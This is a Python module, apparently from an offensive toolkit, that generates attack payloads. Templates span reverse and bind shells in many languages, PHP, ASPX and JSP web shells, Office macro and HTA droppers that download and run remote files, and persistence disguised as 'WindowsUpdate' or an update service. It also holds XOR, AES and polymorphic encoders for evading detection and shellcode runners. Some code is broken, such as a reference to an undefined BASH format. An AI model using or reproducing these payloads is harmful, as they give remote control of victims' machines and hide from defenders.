"""
Payload Generator Module
Advanced multi-platform payload generation with encoders and obfuscation
"""

import asyncio
import base64
import os
import random
import string
import struct
import tempfile
import zlib
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple
from enum import Enum
from datetime import datetime
import hashlib
import logging

logger = logging.getLogger(__name__)


class PayloadType(Enum):
    """Types of payloads"""
    REVERSE_SHELL = "reverse_shell"
    BIND_SHELL = "bind_shell"
    METERPRETER = "meterpreter"
    WEB_SHELL = "web_shell"
    DROPPER = "dropper"
    STAGER = "stager"
    KEYLOGGER = "keylogger"
    SCREENCAP = "screencap"
    DOWNLOAD_EXEC = "download_exec"
    PERSISTENCE = "persistence"


class Platform(Enum):
    """Target platforms"""
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    ANDROID = "android"
    IOS = "ios"
    WEB = "web"
    UNIVERSAL = "universal"


class Architecture(Enum):
    """CPU architectures"""
    X86 = "x86"
    X64 = "x64"
    ARM = "arm"
    ARM64 = "arm64"
    MIPS = "mips"


class OutputFormat(Enum):
    """Payload output formats"""
    RAW = "raw"
    EXE = "exe"
    DLL = "dll"
    ELF = "elf"
    MACHO = "macho"
    APK = "apk"
    PS1 = "ps1"
    BAT = "bat"
    VBA = "vba"
    HTA = "hta"
    MSI = "msi"
    PYTHON = "python"
    PERL = "perl"
    RUBY = "ruby"
    PHP = "php"
    JSP = "jsp"
    ASPX = "aspx"
    WAR = "war"
    JAR = "jar"
    C = "c"
    CSHARP = "csharp"


class EncoderType(Enum):
    """Payload encoders"""
    NONE = "none"
    XOR = "xor"
    BASE64 = "base64"
    SHIKATA_GA_NAI = "shikata_ga_nai"
    AES = "aes"
    ROT13 = "rot13"
    CUSTOM = "custom"


@dataclass
class PayloadConfig:
    """Configuration for payload generation"""
    payload_type: PayloadType
    platform: Platform
    architecture: Architecture
    lhost: str = "0.0.0.0"
    lport: int = 4444
    rhost: str = ""  # For bind shells
    rport: int = 0
    output_format: OutputFormat = OutputFormat.RAW
    encoder: EncoderType = EncoderType.NONE
    encoder_iterations: int = 1
    bad_chars: bytes = b"\x00\x0a\x0d"
    prepend_nops: int = 0
    append_nops: int = 0
    custom_options: Dict[str, Any] = field(default_factory=dict)


@dataclass
class GeneratedPayload:
    """Generated payload result"""
    config: PayloadConfig
    payload: bytes
    encoded_payload: bytes
    size: int
    md5: str
    sha256: str
    generated_at: datetime
    filename: str = ""
    source_code: str = ""
    
    def save(self, filepath: str):
        """Save payload to file"""
        with open(filepath, 'wb') as f:
            f.write(self.encoded_payload)
        self.filename = filepath


class PayloadGenerator:
    """
    Advanced Payload Generator
    Creates multi-platform payloads with encoding and obfuscation
    """
    
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}
        self.output_dir = tempfile.mkdtemp(prefix="hydra_payloads_")
        self.generated_payloads: List[GeneratedPayload] = []
    
    # ==================== Shell Templates ====================
    
    PYTHON_REVERSE_SHELL = '''
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{LHOST}",{LPORT}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'''

    PYTHON_REVERSE_SHELL_WINDOWS = '''
import socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{LHOST}",{LPORT}))
while True:
    data=s.recv(1024)
    if len(data)>0:
        proc=subprocess.Popen(data.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        out=proc.stdout.read()+proc.stderr.read()
        s.send(out)
'''

    BASH_REVERSE_SHELL = 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'
    
    BASH_REVERSE_SHELL_ALT = '/bin/bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"'
    
    NC_REVERSE_SHELL = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f'
    
    PERL_REVERSE_SHELL = '''
use Socket;
$i="{LHOST}";
$p={LPORT};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){{
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
}};
'''

    RUBY_REVERSE_SHELL = '''
require 'socket'
f=TCPSocket.open("{LHOST}",{LPORT}).to_i
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
'''

    PHP_REVERSE_SHELL = '''
<?php
$sock=fsockopen("{LHOST}",{LPORT});
exec("/bin/sh -i <&3 >&3 2>&3");
?>
'''

    PHP_WEB_SHELL = '''
<?php
if(isset($_REQUEST['cmd'])){{
    echo "<pre>";
    $cmd=($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}}
?>
'''

    PHP_WEB_SHELL_ADVANCED = '''
<?php
error_reporting(0);
$auth = "{AUTH_KEY}";
if(isset($_REQUEST['a']) && $_REQUEST['a'] == $auth) {{
    if(isset($_REQUEST['c'])) {{
        $cmd = base64_decode($_REQUEST['c']);
        $output = shell_exec($cmd);
        echo base64_encode($output);
    }}
    if(isset($_REQUEST['upload'])) {{
        $data = base64_decode($_REQUEST['d']);
        file_put_contents($_REQUEST['f'], $data);
        echo "OK";
    }}
    if(isset($_REQUEST['download'])) {{
        echo base64_encode(file_get_contents($_REQUEST['f']));
    }}
}}
?>
'''

    POWERSHELL_REVERSE_SHELL = '''
$client = New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
'''

    POWERSHELL_DOWNLOAD_EXEC = '''
$url = "{URL}"
$output = "$env:TEMP\\{FILENAME}"
(New-Object System.Net.WebClient).DownloadFile($url, $output)
Start-Process $output
'''

    POWERSHELL_ENCODED_RUNNER = '''
powershell -nop -w hidden -enc {ENCODED_CMD}
'''

    ASPX_WEB_SHELL = '''
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{{
    if(Request["cmd"] != null)
    {{
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + Request["cmd"];
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }}
}}
</script>
'''

    JSP_WEB_SHELL = '''
<%@ page import="java.util.*,java.io.*"%>
<%
if(request.getParameter("cmd") != null) {{
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String str;
    while((str = dis.readLine()) != null) {{
        out.println(str + "<br>");
    }}
}}
%>
'''

    CSHARP_REVERSE_SHELL = '''
using System;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Text;

class Program {{
    static void Main() {{
        using(TcpClient client = new TcpClient("{LHOST}", {LPORT})) {{
            using(Stream stream = client.GetStream()) {{
                using(StreamReader rdr = new StreamReader(stream)) {{
                    while(true) {{
                        string cmd = rdr.ReadLine();
                        if(string.IsNullOrEmpty(cmd)) continue;
                        
                        ProcessStartInfo psi = new ProcessStartInfo();
                        psi.FileName = "cmd.exe";
                        psi.Arguments = "/c " + cmd;
                        psi.UseShellExecute = false;
                        psi.RedirectStandardOutput = true;
                        
                        Process proc = Process.Start(psi);
                        string output = proc.StandardOutput.ReadToEnd();
                        byte[] bytes = Encoding.ASCII.GetBytes(output);
                        stream.Write(bytes, 0, bytes.Length);
                    }}
                }}
            }}
        }}
    }}
}}
'''

    C_REVERSE_SHELL_LINUX = '''
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(void) {{
    int sockfd;
    struct sockaddr_in srv;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    srv.sin_family = AF_INET;
    srv.sin_port = htons({LPORT});
    srv.sin_addr.s_addr = inet_addr("{LHOST}");
    
    connect(sockfd, (struct sockaddr *)&srv, sizeof(srv));
    
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    
    execve("/bin/sh", NULL, NULL);
    return 0;
}}
'''

    VBA_REVERSE_SHELL = '''
Sub AutoOpen()
    Dim WSH As Object
    Set WSH = CreateObject("WScript.Shell")
    WSH.Run "powershell -nop -w hidden -c ""$c=New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$r=$o+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}}"""
End Sub
'''

    HTA_PAYLOAD = '''
<html>
<head>
<script language="VBScript">
    Sub RunScript()
        Dim objShell
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run "{COMMAND}", 0, False
    End Sub
    RunScript
    Close
</script>
</head>
<body>
</body>
</html>
'''

    BAT_REVERSE_SHELL = '''
@echo off
powershell -nop -w hidden -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$r=$o+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}}"
'''

    # ==================== Generation Methods ====================
    
    def generate(self, config: PayloadConfig) -> GeneratedPayload:
        """Generate payload based on configuration"""
        payload = self._generate_base_payload(config)
        encoded = self._encode_payload(payload, config)
        
        result = GeneratedPayload(
            config=config,
            payload=payload,
            encoded_payload=encoded,
            size=len(encoded),
            md5=hashlib.md5(encoded).hexdigest(),
            sha256=hashlib.sha256(encoded).hexdigest(),
            generated_at=datetime.now()
        )
        
        self.generated_payloads.append(result)
        return result
    
    def _generate_base_payload(self, config: PayloadConfig) -> bytes:
        """Generate the base payload"""
        payload = b""
        
        if config.payload_type == PayloadType.REVERSE_SHELL:
            payload = self._generate_reverse_shell(config)
        elif config.payload_type == PayloadType.BIND_SHELL:
            payload = self._generate_bind_shell(config)
        elif config.payload_type == PayloadType.WEB_SHELL:
            payload = self._generate_web_shell(config)
        elif config.payload_type == PayloadType.DROPPER:
            payload = self._generate_dropper(config)
        elif config.payload_type == PayloadType.DOWNLOAD_EXEC:
            payload = self._generate_download_exec(config)
        elif config.payload_type == PayloadType.PERSISTENCE:
            payload = self._generate_persistence(config)
        
        # Add NOPs if requested
        if config.prepend_nops > 0:
            payload = (b"\x90" * config.prepend_nops) + payload
        if config.append_nops > 0:
            payload = payload + (b"\x90" * config.append_nops)
        
        return payload
    
    def _generate_reverse_shell(self, config: PayloadConfig) -> bytes:
        """Generate reverse shell payload"""
        template = ""
        
        if config.output_format == OutputFormat.PYTHON:
            if config.platform == Platform.WINDOWS:
                template = self.PYTHON_REVERSE_SHELL_WINDOWS
            else:
                template = self.PYTHON_REVERSE_SHELL
                
        elif config.output_format == OutputFormat.PS1:
            template = self.POWERSHELL_REVERSE_SHELL
            
        elif config.output_format == OutputFormat.BAT:
            template = self.BAT_REVERSE_SHELL
            
        elif config.output_format == OutputFormat.PHP:
            template = self.PHP_REVERSE_SHELL
            
        elif config.output_format == OutputFormat.PERL:
            template = self.PERL_REVERSE_SHELL
            
        elif config.output_format == OutputFormat.RUBY:
            template = self.RUBY_REVERSE_SHELL
            
        elif config.output_format == OutputFormat.CSHARP:
            template = self.CSHARP_REVERSE_SHELL
            
        elif config.output_format == OutputFormat.C:
            template = self.C_REVERSE_SHELL_LINUX
            
        elif config.output_format == OutputFormat.VBA:
            template = self.VBA_REVERSE_SHELL
            
        elif config.output_format == OutputFormat.HTA:
            ps_cmd = self.POWERSHELL_REVERSE_SHELL.format(
                LHOST=config.lhost,
                LPORT=config.lport
            )
            encoded = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
            command = f'powershell -nop -w hidden -enc {encoded}'
            template = self.HTA_PAYLOAD.replace("{COMMAND}", command)
            
        else:
            # Default to bash
            template = self.BASH_REVERSE_SHELL
        
        # Replace placeholders
        payload = template.format(
            LHOST=config.lhost,
            LPORT=config.lport
        )
        
        return payload.encode()
    
    def _generate_bind_shell(self, config: PayloadConfig) -> bytes:
        """Generate bind shell payload"""
        if config.output_format == OutputFormat.PYTHON:
            template = '''
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0",{LPORT}))
s.listen(1)
conn,addr=s.accept()
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'''
        elif config.output_format == OutputFormat.PS1:
            template = '''
$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any,{LPORT})
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
'''
        else:
            template = 'nc -lvp {LPORT} -e /bin/sh'
        
        return template.format(LPORT=config.lport).encode()
    
    def _generate_web_shell(self, config: PayloadConfig) -> bytes:
        """Generate web shell payload"""
        if config.output_format == OutputFormat.PHP:
            if config.custom_options.get('advanced', False):
                auth_key = config.custom_options.get('auth_key', self._random_string(16))
                template = self.PHP_WEB_SHELL_ADVANCED.format(AUTH_KEY=auth_key)
            else:
                template = self.PHP_WEB_SHELL
                
        elif config.output_format == OutputFormat.ASPX:
            template = self.ASPX_WEB_SHELL
            
        elif config.output_format == OutputFormat.JSP:
            template = self.JSP_WEB_SHELL
            
        else:
            template = self.PHP_WEB_SHELL
        
        return template.encode()
    
    def _generate_dropper(self, config: PayloadConfig) -> bytes:
        """Generate dropper/stager payload"""
        url = config.custom_options.get('url', '')
        filename = config.custom_options.get('filename', 'payload.exe')
        
        if config.output_format == OutputFormat.PS1:
            template = '''
$u="{URL}"
$p="$env:TEMP\\{FILENAME}"
$w=New-Object Net.WebClient
$w.DownloadFile($u,$p)
Start-Process $p -WindowStyle Hidden
'''
        elif config.output_format == OutputFormat.VBA:
            template = '''
Sub AutoOpen()
    Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
    Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
    xHttp.Open "GET", "{URL}", False
    xHttp.Send
    With bStrm
        .Type = 1
        .Open
        .write xHttp.responseBody
        .savetofile Environ("TEMP") & "\\{FILENAME}", 2
    End With
    Shell Environ("TEMP") & "\\{FILENAME}", vbHide
End Sub
'''
        elif config.output_format == OutputFormat.BAT:
            template = '''
@echo off
certutil -urlcache -split -f "{URL}" "%TEMP%\\{FILENAME}"
start "" "%TEMP%\\{FILENAME}"
'''
        else:
            template = '''
import urllib.request
import subprocess
import os
url = "{URL}"
path = os.path.join(os.environ.get("TEMP", "/tmp"), "{FILENAME}")
urllib.request.urlretrieve(url, path)
subprocess.Popen(path, shell=True)
'''
        
        return template.format(URL=url, FILENAME=filename).encode()
    
    def _generate_download_exec(self, config: PayloadConfig) -> bytes:
        """Generate download and execute payload"""
        return self._generate_dropper(config)
    
    def _generate_persistence(self, config: PayloadConfig) -> bytes:
        """Generate persistence payload"""
        payload_path = config.custom_options.get('payload_path', '')
        
        if config.platform == Platform.WINDOWS:
            if config.output_format == OutputFormat.PS1:
                template = '''
# Registry Run Key
$path = "{PAYLOAD_PATH}"
New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdate" -Value $path -PropertyType String -Force

# Scheduled Task
$action = New-ScheduledTaskAction -Execute $path
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Force

# WMI Event Subscription
$filterNS = "root\\cimv2"
$filterName = "WindowsUpdate"
$filterPath = "__EventFilter.Name='$filterName'"
$filterQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"
$filter = Set-WmiInstance -Namespace $filterNS -Class __EventFilter -Arguments @{{Name=$filterName;EventNamespace=$filterNS;QueryLanguage='WQL';Query=$filterQuery}}
'''
            else:
                template = '''
@echo off
reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsUpdate /t REG_SZ /d "{PAYLOAD_PATH}" /f
schtasks /create /tn "WindowsUpdate" /tr "{PAYLOAD_PATH}" /sc onlogon /f
'''
        else:
            template = '''
#!/bin/bash
# Cron persistence
(crontab -l 2>/dev/null; echo "@reboot {PAYLOAD_PATH}") | crontab -
# Bashrc persistence
echo "{PAYLOAD_PATH} &" >> ~/.bashrc
# Systemd service
cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update Service
[Service]
ExecStart={PAYLOAD_PATH}
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
'''
        
        return template.format(PAYLOAD_PATH=payload_path).encode()
    
    # ==================== Encoding Methods ====================
    
    def _encode_payload(self, payload: bytes, config: PayloadConfig) -> bytes:
        """Encode the payload"""
        encoded = payload
        
        for _ in range(config.encoder_iterations):
            if config.encoder == EncoderType.XOR:
                encoded = self._xor_encode(encoded)
            elif config.encoder == EncoderType.BASE64:
                encoded = self._base64_encode(encoded, config)
            elif config.encoder == EncoderType.SHIKATA_GA_NAI:
                encoded = self._shikata_encode(encoded)
            elif config.encoder == EncoderType.AES:
                encoded = self._aes_encode(encoded)
            elif config.encoder == EncoderType.ROT13:
                encoded = self._rot13_encode(encoded)
        
        # Remove bad characters
        if config.bad_chars:
            encoded = self._remove_bad_chars(encoded, config.bad_chars)
        
        return encoded
    
    def _xor_encode(self, data: bytes, key: bytes = None) -> bytes:
        """XOR encode with random key"""
        if key is None:
            key = bytes([random.randint(1, 255) for _ in range(4)])
        
        encoded = bytearray()
        for i, byte in enumerate(data):
            encoded.append(byte ^ key[i % len(key)])
        
        # Prepend decoder stub with key
        decoder = self._generate_xor_decoder(key)
        return decoder + bytes(encoded)
    
    def _generate_xor_decoder(self, key: bytes) -> bytes:
        """Generate XOR decoder stub"""
        key_hex = key.hex()
        decoder = f'''
import sys
k=bytes.fromhex("{key_hex}")
d=sys.stdin.buffer.read()
exec(bytes([d[i]^k[i%len(k)] for i in range(len(d))]))
# ENCODED_DATA_FOLLOWS:
'''.encode()
        return decoder
    
    def _base64_encode(self, data: bytes, config: PayloadConfig) -> bytes:
        """Base64 encode with decoder"""
        encoded = base64.b64encode(data).decode()
        
        if config.output_format == OutputFormat.PS1:
            return f'powershell -enc {base64.b64encode(data.decode().encode("utf-16le")).decode()}'.encode()
        elif config.output_format == OutputFormat.PYTHON:
            return f'import base64;exec(base64.b64decode("{encoded}"))'.encode()
        elif config.output_format == OutputFormat.BASH:
            return f'echo {encoded}|base64 -d|bash'.encode()
        else:
            return base64.b64encode(data)
    
    def _shikata_encode(self, data: bytes) -> bytes:
        """Shikata Ga Nai style polymorphic encoding"""
        # Simplified polymorphic XOR with dynamic key generation
        key_len = random.randint(4, 8)
        key = bytes([random.randint(1, 255) for _ in range(key_len)])
        
        # XOR encode
        encoded = bytearray()
        for i, byte in enumerate(data):
            encoded.append(byte ^ key[i % len(key)])
        
        # Add FPU-based decoder stub (simplified)
        decoder_stub = self._generate_polymorphic_decoder(key, len(data))
        
        return decoder_stub + bytes(encoded)
    
    def _generate_polymorphic_decoder(self, key: bytes, data_len: int) -> bytes:
        """Generate polymorphic decoder stub"""
        # This is a simplified Python-based polymorphic decoder
        key_list = ','.join(str(b) for b in key)
        decoder = f'''
import ctypes
k=[{key_list}]
l={data_len}
import sys
d=sys.stdin.buffer.read(l)
o=bytes([d[i]^k[i%len(k)] for i in range(l)])
exec(o)
'''.encode()
        return decoder
    
    def _aes_encode(self, data: bytes) -> bytes:
        """AES encode payload"""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            import os as crypto_os
            
            key = crypto_os.urandom(32)
            iv = crypto_os.urandom(16)
            
            # Pad data
            pad_len = 16 - (len(data) % 16)
            padded = data + bytes([pad_len] * pad_len)
            
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            encrypted = encryptor.update(padded) + encryptor.finalize()
            
            # Generate decoder with embedded key
            decoder = self._generate_aes_decoder(key, iv)
            return decoder + encrypted
            
        except ImportError:
            # Fallback to XOR if cryptography not available
            return self._xor_encode(data)
    
    def _generate_aes_decoder(self, key: bytes, iv: bytes) -> bytes:
        """Generate AES decoder stub"""
        decoder = f'''
from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
from cryptography.hazmat.backends import default_backend
import sys
k={list(key)}
i={list(iv)}
d=sys.stdin.buffer.read()
c=Cipher(algorithms.AES(bytes(k)),modes.CBC(bytes(i)),backend=default_backend())
dec=c.decryptor()
p=dec.update(d)+dec.finalize()
exec(p[:-p[-1]])
'''.encode()
        return decoder
    
    def _rot13_encode(self, data: bytes) -> bytes:
        """ROT13 encode (for text-based payloads)"""
        result = []
        for byte in data:
            if 65 <= byte <= 90:  # A-Z
                result.append(((byte - 65 + 13) % 26) + 65)
            elif 97 <= byte <= 122:  # a-z
                result.append(((byte - 97 + 13) % 26) + 97)
            else:
                result.append(byte)
        return bytes(result)
    
    def _remove_bad_chars(self, data: bytes, bad_chars: bytes) -> bytes:
        """Remove bad characters from payload"""
        result = bytearray()
        for byte in data:
            if byte not in bad_chars:
                result.append(byte)
        return bytes(result)
    
    # ==================== Helper Methods ====================
    
    def _random_string(self, length: int) -> str:
        """Generate random string"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def obfuscate_powershell(self, script: str) -> str:
        """Obfuscate PowerShell script"""
        # Variable randomization
        replacements = {
            '$client': f'${self._random_string(8)}',
            '$stream': f'${self._random_string(8)}',
            '$bytes': f'${self._random_string(8)}',
            '$data': f'${self._random_string(8)}',
            '$sendback': f'${self._random_string(8)}',
        }
        
        for old, new in replacements.items():
            script = script.replace(old, new)
        
        # Case randomization for cmdlets
        import re
        
        def randomize_case(match):
            word = match.group(0)
            return ''.join(
                c.upper() if random.random() > 0.5 else c.lower()
                for c in word
            )
        
        # String concatenation
        def concat_string(s):
            if len(s) < 3:
                return f'"{s}"'
            parts = []
            i = 0
            while i < len(s):
                chunk_len = random.randint(1, 3)
                parts.append(f'"{s[i:i+chunk_len]}"')
                i += chunk_len
            return '+'.join(parts)
        
        return script
    
    def generate_shellcode_runner(self, shellcode: bytes, 
                                   platform: Platform = Platform.WINDOWS) -> str:
        """Generate shellcode runner"""
        if platform == Platform.WINDOWS:
            sc_hex = ''.join(f'\\x{b:02x}' for b in shellcode)
            return f'''
import ctypes

shellcode = b"{sc_hex}"

kernel32 = ctypes.windll.kernel32
kernel32.VirtualAlloc.restype = ctypes.c_void_p
kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
kernel32.CreateThread.argtypes = [ctypes.c_int, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int)]

ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
handle = kernel32.CreateThread(None, 0, ptr, None, 0, None)
kernel32.WaitForSingleObject(handle, -1)
'''
        else:
            sc_hex = ','.join(f'0x{b:02x}' for b in shellcode)
            return f'''
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = {{{sc_hex}}};

int main(void) {{
    void *ptr = mmap(NULL, sizeof(shellcode), 
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(ptr, shellcode, sizeof(shellcode));
    ((void(*)())ptr)();
    return 0;
}}
'''
    
    def list_payloads(self) -> List[Dict[str, Any]]:
        """List available payload types and formats"""
        return {
            'payload_types': [t.value for t in PayloadType],
            'platforms': [p.value for p in Platform],
            'architectures': [a.value for a in Architecture],
            'output_formats': [f.value for f in OutputFormat],
            'encoders': [e.value for e in EncoderType],
        }
    
    def get_payload_info(self, payload_type: PayloadType) -> Dict[str, Any]:
        """Get information about a specific payload type"""
        info = {
            PayloadType.REVERSE_SHELL: {
                'name': 'Reverse Shell',
                'description': 'Connects back to attacker machine',
                'required_options': ['lhost', 'lport'],
                'supported_formats': ['python', 'ps1', 'bat', 'php', 'perl', 'ruby', 'c', 'csharp', 'vba', 'hta']
            },
            PayloadType.BIND_SHELL: {
                'name': 'Bind Shell',
                'description': 'Listens on target machine for connections',
                'required_options': ['lport'],
                'supported_formats': ['python', 'ps1', 'bash']
            },
            PayloadType.WEB_SHELL: {
                'name': 'Web Shell',
                'description': 'Web-based command execution',
                'required_options': [],
                'supported_formats': ['php', 'aspx', 'jsp']
            },
            PayloadType.DROPPER: {
                'name': 'Dropper/Stager',
                'description': 'Downloads and executes payload',
                'required_options': ['url', 'filename'],
                'supported_formats': ['ps1', 'vba', 'bat', 'python']
            },
        }
        return info.get(payload_type, {})
    
    def cleanup(self):
        """Clean up temporary files"""
        import shutil
        try:
            shutil.rmtree(self.output_dir)
        except Exception:
            pass
